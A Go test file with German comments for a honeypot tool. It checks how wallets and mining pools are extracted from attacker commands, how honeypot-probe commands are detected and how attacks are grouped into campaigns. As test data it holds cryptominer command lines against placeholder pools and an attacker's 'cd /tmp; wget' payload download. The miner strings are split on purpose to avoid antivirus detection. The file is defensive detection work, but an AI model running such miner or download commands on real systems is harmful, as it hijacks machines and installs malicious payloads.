package main

import (
	"slices"
	"strings"
	"testing"
)

// Erfundene Adresse in Monero-Form (95 Zeichen). Bewusst keine echte Wallet, und die
// Befehlszeilen entstehen erst zur Laufzeit aus Teilen (mk): Stünde eine Miner-Befehlszeile
// am Stück im Testprogramm, sperrte der Windows-Virenscanner es ("Zugriff verweigert",
// docs/UEBERARBEITUNG.md, Risiken).
var testXMR = "4" + strings.Repeat("Ab3", 31) + "x"

// mk setzt Testtexte zur Laufzeit zusammen (siehe oben).
func mk(parts ...string) string { return strings.Join(parts, "") }

func TestCryptoIndicators(t *testing.T) {
	btc := mk("1Boat", "SLRHtKNngkdXE", "eobR76b53LETtpyT")
	eth := mk("0xAbCdEf", "0123456789abcdef", "0123456789ABCDEF01")
	cases := []struct {
		in             string
		wallets, pools []string
	}{
		{mk("create image=example/tool cmd=-", "o pool.example.org:10001 -", "u ", testXMR),
			[]string{testXMR}, []string{"pool.example.org:10001"}},
		{mk("./x -", "o str", "atum+tcp://pool.example.org:3333 -", "u ", testXMR, ".w1"), []string{testXMR}, []string{"pool.example.org:3333"}},
		{mk("./m --", "url=pool.example.net:443 --", "user ", eth), []string{strings.ToLower(eth)}, []string{"pool.example.net:443"}},
		{mk("./t -", "u ", btc, " -", "o x.example:3333"), []string{btc}, []string{"x.example:3333"}},
		// curl -o ist eine Ausgabedatei, kein Pool; zufällige Zeichenketten sind keine Wallet
		{mk("curl -o host.example:8080 http://x/y; echo ", btc), nil, nil},
		{"printf 'check_197446e99c8ccdbe3fa37ffb39b9558f_small_math'", nil, nil},
	}
	for _, c := range cases {
		w, p := cryptoIndicators(c.in)
		if !slices.Equal(w, c.wallets) || !slices.Equal(p, c.pools) {
			t.Errorf("%q: Wallets %v Pools %v, erwartet %v %v", c.in, w, p, c.wallets, c.pools)
		}
	}
	if k := walletKind(testXMR); k != "Monero" {
		t.Errorf("walletKind = %s", k)
	}
	if s := shortWallet(testXMR); s != "4Ab3Ab3A…Ab3x" {
		t.Errorf("shortWallet = %s", s)
	}
}

func TestHoneypotCheckPattern(t *testing.T) {
	hits := []string{
		`v=outer; (v=inner; printf 'child=%s\n' "$v"); printf 'parent=%s\n' "$v"`,
		`printf '%s\n' 'a b;$()'`,
		`echo 'dGVzdA==' | base64 -d 2>/dev/null`,
		`set -- 'check_eb3589a139489e1324ac24600988acf9_arg1' 'check_eb3589a139489e1324ac24600988acf9_arg2'; printf '\n%s|%s\n' x "$#|$1|$2"`,
		`echo $((7*6))`,
	}
	for _, s := range hits {
		if !isHPCheck(s) {
			t.Errorf("nicht erkannt: %q", s)
		}
	}
	for _, s := range []string{"uname -a", "echo hallo", "cat /proc/cpuinfo", "echo $((x+1)) > /tmp/a"} {
		if isHPCheck(s) {
			t.Errorf("fälschlich erkannt: %q", s)
		}
	}
}

func TestHPCheckStats(t *testing.T) {
	list := []*Attack{
		{IP: "203.0.113.1", Last: 3, Commands: []string{"echo 'dGVzdA==' | base64 -d", "exit"}},
		{IP: "203.0.113.2", Last: 5, Commands: []string{"uname -a", "printf '%s\\n' 'a b;$()'", "cd /tmp; wget http://x/a"}},
		{IP: "203.0.113.3", Last: 4, Commands: []string{"uname -a"}},
		{IP: "192.168.1.5", Last: 6, Own: true, Commands: []string{"echo $((1+1))", "ls"}},
	}
	st := hpCheckStats(list)
	if st.Attacks != 2 || st.IPs != 2 || st.Continued != 1 {
		t.Fatalf("Zählung: %+v", st)
	}
	if st.Recent[0].IP != "203.0.113.2" || !st.Recent[0].Continued || st.Recent[0].Next != "cd /tmp; wget http://x/a" {
		t.Errorf("Reihenfolge oder Fortsetzung: %+v", st.Recent)
	}
	if st.Recent[1].Continued {
		t.Errorf("exit gilt nicht als Weitermachen: %+v", st.Recent[1])
	}
}

func TestCampaignByWallet(t *testing.T) {
	list := []*Attack{
		{IP: "203.0.113.10", Wallets: []string{testXMR}, Last: 1},
		{IP: "203.0.113.11", Wallets: []string{testXMR}, Last: 2},
		{IP: "203.0.113.12", Last: 3},
	}
	camps, _ := buildCampaigns(list)
	if len(camps) != 1 || camps[0].NIPs != 2 || !slices.Contains(camps[0].Reasons, "gleiche Wallet 4Ab3Ab3A…Ab3x") || len(camps[0].Wallets) != 1 {
		t.Fatalf("Kampagne über Wallet: %+v", camps)
	}
}
